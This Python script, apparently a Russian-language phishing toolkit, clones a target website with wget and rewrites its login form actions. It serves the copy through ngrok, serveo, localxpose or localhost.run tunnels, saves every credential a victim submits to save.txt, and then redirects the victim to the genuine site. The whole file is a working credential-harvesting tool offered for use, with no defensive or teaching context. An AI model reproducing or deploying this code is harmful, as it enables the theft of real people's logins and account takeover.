from subprocess import check_output, CalledProcessError
from time import sleep
import os
import http.server
import socketserver
import re
import ssl
from os import system
import sys

GREEN = "\033[1;31m"
RED = "\033[1;31m"
RESET = "\033[1;31m"
os.system("fuser -k -n tcp 8080")
os.system("fuser -k -n tcp 80")
os.system("rm -rf .tmp")
os.system("mkdir .tmp")
os.system("clear")


def BANNER():
    print("""\033[1;34m
 █████░ █   ▒▓  ▒███▒ ██████ █████   ▓███▒ █    █
 █   ▓█ █  ▒█  ░█▒ ░█ █        █    █▓  ░█ █    █
 █    █ █ ▒█   █▒     █        █    █      █    █
 █   ▓█ █▒█    █      █        █    █▓░    █    █
 █████░ ███░   █   ██ ██████   █     ▓██▓  ██████
 █      █ ▒█   █    █ █        █        ▓█ █    █
 █      █  █▓  █▒   █ █        █         █ █    █
 █      █   █░ ▒█░ ░█ █        █    █░  ▓█ █    █
 █      █   ▒█  ▒███▒ █      █████  ▒████░ █    █
 _¶¶¶¶¶______________________________________¶¶¶¶
__¶¶____¶¶¶_______¶¶¶¶¶¶_¶¶¶_¶¶¶¶¶______¶¶¶¶___¶
__¶_¶¶_____¶¶¶¶¶¶__________________¶¶¶¶¶¶_____¶¶
__¶___¶__________¶___________________________¶__¶
__¶____¶___________________________________¶¶___¶
__¶______¶¶_______________________________¶_____¶
__¶_______¶____________________________¶¶_______¶
__¶______¶________________________________¶_____¶
___¶____¶__________________________________¶___¶
__¶¶___¶____________________________________¶___¶
__¶_¶¶¶______________________________________¶_¶
_¶___¶________________________________________¶¶_¶
_¶________________¶¶¶¶¶¶____¶¶¶¶¶¶______________¶_¶
¶__¶____________¶¶¶¶¶¶¶¶____¶¶¶¶¶¶¶¶____________¶_¶
¶__¶__________¶¶__¶¶¶¶¶¶____¶¶¶____¶¶¶¶_________¶_¶
¶_¶¶________¶¶¶_¶¶¶__¶¶¶____¶¶___¶¶¶_¶¶¶_________¶_¶
¶_¶¶________¶¶_¶¶¶¶¶¶_¶______¶_¶¶¶¶¶¶¶¶_¶_______¶¶_¶
¶_¶¶______¶__¶_¶¶¶¶_¶¶________¶¶_¶¶¶¶¶_¶__¶_____¶¶_¶
¶_¶¶¶____¶¶¶_¶¶_¶¶¶_¶¶¶______¶¶¶__¶¶¶_¶_¶_¶____¶¶¶_¶
¶_¶_¶____¶_¶¶__¶___¶¶¶________¶¶¶___¶__¶¶_¶____¶_¶_¶
¶_¶¶_¶__¶___¶¶___¶¶¶¶¶________¶¶¶¶¶___¶¶¶__¶__¶__¶_¶
_¶_¶_¶_¶¶___¶¶¶¶_¶¶¶¶¶________¶¶¶¶__¶¶¶¶___¶____¶_¶
__¶_¶_¶¶______¶¶__¶¶_¶________¶¶¶__¶¶¶___¶__¶¶¶¶_¶
___¶¶¶¶____¶___¶¶____¶________¶___¶¶¶___¶______¶
_____¶¶¶¶______¶¶____¶________¶___¶¶¶_______¶¶
_______¶¶¶¶____¶¶___¶__________¶___¶¶______¶
_________¶¶____¶¶___¶__________¶___¶¶____¶¶
___________¶¶_¶¶¶___¶__________¶___¶¶_¶¶¶
______________¶_¶___¶__________¶___¶_¶
_______________¶¶___¶__________¶___¶¶
________________¶___¶_¶¶¶¶¶¶¶¶_¶___¶
________________¶___¶¶¶¶¶¶¶¶¶¶¶¶___¶
_________________¶__¶¶¶¶¶¶¶¶¶¶¶¶__¶
__________________¶_¶¶¶¶¶¶¶¶¶¶¶¶_¶
__________________¶___¶¶¶¶¶¶¶¶___¶
___________________¶___¶¶¶¶¶¶___¶
____________________¶__________¶
_____________________¶¶¶¶¶¶¶¶¶¶
 \033
                                                                                @pkgsearch        
\033[1;33m [@]\033[1;39mАдрес сайта \033[1;33m= \033[1;39mhttps://www.wannadeauth.com \033[1;33m [@]\033[1;39mпорт \033[1;33m= \033[1;39m8080
         """)


BANNER()
CURRENT_PATH = os.getcwd()
DIRKR = os.path.join(CURRENT_PATH, '.tmp')
INDEX_LOGIN = os.path.join(DIRKR, 'index.html')
POST_SAVE = os.path.join(CURRENT_PATH, 'save.txt')
NO = {'no', 'n'}
use_wget = "Y"
if use_wget.lower() not in NO:

    url = input(" \033[1;33m[@]\033[1;39murl \033[1;33m= \033[1;39m")
    user_agent = "Mozilla/5.0"
    PORT = int(input("\n \033[1;33m[@]\033[1;39mпорт \033[1;33m= \033[1;39m"))
    port22 = PORT
    print("\033[1;31m")
    os.system(
        "wget -E -H -k -K -p -nH --cut-dirs=100 --referer=http://www.google.com -nv {} --user-agent {} --directory-prefix={}".format(
            url, user_agent, DIRKR))
    os.system("cp ngrok .tmp")
    os.system("cp loclx .tmp")
    os.system("clear")
else:
    print("")
if not os.path.isfile(INDEX_LOGIN):
    html_files_in_web = []

    for file in os.listdir(DIRKR):
        if file.endswith(".html") or file.endswith(".htm"):
            html_files_in_web.append(os.path.join(DIRKR, file))

    if len(html_files_in_web) == 1:
        os.rename(os.path.join(DIRKR, html_files_in_web[0]), INDEX_LOGIN)
    else:

        print("\033[1;33mглавная страница не определена :")
        index_filename = input("\033[1;39m\n file in \033[1;33m .tmp/\033[1;39m определите главную страницу:\033[1;33m")
        os.rename(os.path.join(DIRKR, index_filename), INDEX_LOGIN)

        print("")

redirect_ip = url
page12 = open(INDEX_LOGIN, 'r').read()
forms_pattern = '(<form[^>]*?action=")([^"]*)("[^>]*>)'
page12 = re.sub(forms_pattern, r'\1\\redict\3', page12)
with open(INDEX_LOGIN, 'wb') as file:
    file.write(str.encode(page12))


class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):

        if os.path.exists(self.translate_path(self.path)):
            f = self.send_head()
            if f:
                self.copyfile(f, self.wfile)
                f.close()
        else:

            remote_path = "{}{}".format(redirect_ip, self.path)
            self.send_response(303)
            self.send_header("Location", remote_path)
            self.end_headers()

    def do_POST(self):

        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        if self.path == "/redict":
            sys.stdout.write(GREEN)
            print("\n\tfile saved in -> save.txt ...")
            sys.stdout.write(RESET)
            self.send_response(303)
            self.send_header("Location", "{}".format(redirect_ip))

            with open(POST_SAVE, 'a+') as file:
                file.write(body.decode("utf-8"))
                file.write("\n\n")


        else:
            self.send_response(308)
            self.send_header("Location", "https://{}{}".format(redirect_ip, self.path))

        self.end_headers()

    def log_message(self, format, *args):
        return


def serverserveo():
    port11122 = PORT
    os.system(
        "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > link.url 2> /dev/null &" % (
            port11122))
    sleep(8)
    try:
        sleep(8)
        output = check_output("grep -o 'https://[0-9a-z]*\.serveo.net' link.url", shell=True)
        urlserveo = str(output).strip("b ' \ n")
        print("\n\t\033[1;33mSERVEO URL \033[1;39m: ", urlserveo)
    except CalledProcessError:
        sleep(4)
        return serverserveo()


def subdomainserveo():
    port111 = PORT
    linkserveo = input("\n\t\033[1;33mSUBDOMAIN : \033[1;39m")
    if not ".serveo.net" in linkserveo:
        linkserveo += ".serveo.net"
    else:
        pass
    os.system(
        'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > link111.url 2> /dev/null &' % (
        linkserveo, port111))
    sleep(8)
    try:
        sleep(8)
        output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link111.url", shell=True)
        urlserveo2 = str(output).strip("b ' \ n r")
        print("\n\t\033[1;33mSERVEO URL \033[1;39m: ", urlserveo2)
    except CalledProcessError:
        sleep(8)
        print("\n\033[1;33\t FFAILED TO GET THIS DOMAIN \033[1;39m ")
        return subdomainserveo()


def subdomainxpose():
    port222 = PORT
    linkxpose = input("\n\t\033[1;33mSUBDOMAIN : \033[1;39m")
    os.system('./loclx tunnel http --to :%s --subdomain %s > link222.url 2> /dev/null &' % (port222, linkxpose))
    sleep(8)
    try:
        sleep(8)
        output = check_output("grep -o 'https://[0-9a-z]*\.loclx.io' link222.url", shell=True)
        urlxpose2 = str(output).strip("b ' \ n r")
        print("\n\t\033[1;33mLOCALXPOSE URL \033[1;39m: ", urlxpose2)
    except CalledProcessError:
        sleep(4)
        print("\n\033[1;33\t FFAILED TO GET THIS DOMAIN \033[1;39m ")
        return subdomainxpose()


def serverngrok():
    port22 = PORT
    os.system("chmod +x ngrok")
    os.system("./ngrok http {} > /dev/null &".format(port22))
    sleep(8)
    os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link2.url')
    urlFile = open('link2.url', 'r')
    url = urlFile.read()
    urlFile.close()
    if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
        print("\n\t\033[1;33mNGROK URL \033[1;39m: " + url)


def serverLocalrun():
    port33333 = PORT
    os.system(
        "xterm -hold -e 'ssh -T -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R 80:localhost:%s ssh.localhost.run > link44.url  ' &" % (
            port33333))
    sleep(8)
    os.system("grep -o '.\{0,0\}https.\{0,50\}' link44.url")
    try:
        sleep(8)
        output = check_output("grep -o '.\{0,0\}https.\{0,50\}' link44.url", shell=True)
        urlserveo = str(output).strip("b ' \ n")
        print("\n\t\033[1;33mSERVER LOCALRUN \033[1;39m: ", urlserveo + "n")
    except CalledProcessError:
        sleep(4)
        return serverLocalrun()
    """	
    os.system("ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s ssh.localhost.run > link44.url &"%(port33333))
    sleep(8)
    try:
        sleep(20)			
        output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link44.url", shell=True)
        urlserveo = str(output).strip("b ' \ n")
        print("\n\t\033[1;33mSERVEO LOCALRUN \033[1;39m: ",urlserveo)
    except CalledProcessError:
        sleep(4)
        return serverserveo()
        """


def serverxpose():
    port33 = PORT
    os.system('./loclx tunnel http --to :%s > link3.url 2> /dev/null &' % (port33))
    sleep(8)
    try:
        sleep(8)
        output = check_output("grep -o 'https://[0-9a-z]*\.loclx.io' link3.url", shell=True)
        url = str(output).strip("b ' \ n r")
        print("\n\t\033[1;33mLOCALXPOSE URL \033[1;39m: " + url)
    except CalledProcessError:
        sleep(4)
        return serverxpose()


def launch_server(port):
    os.chdir(DIRKR)
    httpd = socketserver.TCPServer(("", port), SimpleHTTPRequestHandler)

    try:

        print("""
                                                                                                                   Pkgsearch         
         """)
        print("\t\033[1;33m[@]\033[1;39murl\033[1;33m =\033[1;39m ", url, " ",
              "\033[1;33m[@]\033[1;39mport\033[1;33m = \033[1;39m", PORT)
        print("\n\t\033[1;33mSTART SERVER : ")
        print("\n\t\033[1;33m1)\033[1;39mSERVEO  ")
        print("\n\t\033[1;33m2)\033[1;39mNGROK  ")
        print("\n\t\033[1;33m3)\033[1;39mLOCALXPOSE  ")
        print("\n\t\033[1;33m4)\033[1;39mLOCALHOST  ")
        print("\n\t\033[1;33m5)\033[1;39mLOCALRUN  ")

        select = int(input("\n\t\033[1;33mOPTIONS : \033[1;39m"))

        if select == 1:
            print("\n\t\033[1;33m1)\033[1;39mSUBDOMAIN  ")
            print("\n\t\033[1;33m2)\033[1;39mRANDOM DOMAIN  ")
            select2 = int(input("\n\t\033[1;33mOPTIONS : \033[1;39m"))
            if select2 == 1:
                subdomainserveo()
            else:
                serverserveo()

        elif select == 2:
            serverngrok()
        elif select == 3:
            print("\n\t\033[1;33m1)\033[1;39mSUBDOMAIN  ")
            print("\n\t\033[1;33m2)\033[1;39mRANDOM DOMAIN  ")
            select3 = int(input("\n\t\033[1;33mOPTIONS : \033[1;39m"))
            if select3 == 1:
                subdomainxpose()
            else:
                serverxpose()
        elif select == 4:
            print("\n\t\033[1;33mSERVER \033[1;39m: http://localhost:{}".format(port))

        elif select == 5:
            serverLocalrun()
        else:
            serverngrok()

        port33333 = 8080
        os.system("ssh -T -R 80:localhost:%s ssh.localhost.run > link44.url 2> /dev/null &" % (port33333))
        httpd.serve_forever()

    except KeyboardInterrupt:
        sys.stdout.write(RED)

        sys.stdout.write(RESET)
        os.system("rm -rf .tmp")
        httpd.server_close()


launch_server(PORT)
